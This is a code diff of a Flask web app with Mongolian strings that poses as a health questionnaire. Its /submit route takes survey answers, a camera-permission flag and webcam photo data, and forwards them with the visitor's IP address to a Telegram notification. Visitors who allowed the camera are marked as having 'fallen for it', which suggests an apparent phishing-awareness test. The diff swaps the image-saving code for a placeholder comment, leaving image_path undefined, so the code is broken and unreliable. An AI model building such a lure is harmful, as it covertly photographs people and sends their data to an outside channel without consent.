@@ -44,32 +44,31 @@ def success():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    role = request.form.get('role_department', 'Unknown')
-    prof = request.form.get('profession', 'Unknown')
-    photo_data = request.form.get('photo_data', '')
-    camera_allowed = request.form.get('camera_allowed', 'false') # JS-ээс ирэх утга
+    # Шинэ асуултуудын хариуг авах
+    pos_cat = request.form.get('position_cat', 'Мэдэгдээгүй')
+    hours = request.form.get('comp_hours', 'Мэдэгдээгүй')
+    exercise = request.form.get('exercise_status', 'Мэдэгдээгүй')
     
-    image_path = None
-    if photo_data and ',' in photo_data:
-        try:
-            encoded_data = photo_data.split(',')[1]
-            decoded = base64.b64decode(encoded_data)
-            filename = f"img_{int(time.time())}.jpg"
-            image_path = os.path.join(UPLOAD_FOLDER, filename)
-            with open(image_path, 'wb') as f:
-                f.write(decoded)
-        except Exception as e:
-            print(f"Image saving error: {e}")
+    photo_data = request.form.get('photo_data', '')
+    camera_allowed = request.form.get('camera_allowed', 'false')
+    
+    # ... (зураг хадгалах хэсэг хэвээрээ) ...
 
-    msg = f"📋 ТЕСТНИЙ ХАРИУ:\n👤 Хэлтэс: {role}\n💼 Мэргэжил: {prof}\n📸 Камер зөвшөөрсөн: {camera_allowed}\n📍 IP: {request.remote_addr}"
+    # Telegram руу явуулах мэдээллийг шинэчлэх
+    msg = (f"📋 ЭРҮҮЛ МЭНДИЙН ТЕСТ:\n"
+           f"👤 Ангилал: {pos_cat}\n"
+           f"💻 Суудаг цаг: {hours} цаг\n"
+           f"🏃 Дасгал хийдэг үү: {exercise}\n"
+           f"📸 Камер: {'Зөвшөөрсөн (УНАЛАА)' if camera_allowed == 'true' else 'Татгалзсан (ТЭНЦЛЭЭ)'}\n"
+           f"📍 IP: {request.remote_addr}")
+    
     send_telegram_media_notification(msg, image_path)
-
-    # Камер зөвшөөрсөн эсэхээс хамаарч redirect хийх
+    
+    # Redirect логик
     if camera_allowed == 'true':
         return redirect(url_for('fail_page'))
     else:
         return redirect(url_for('pass_page'))
-
 @app.route('/fail')
 def fail_page():
     return """
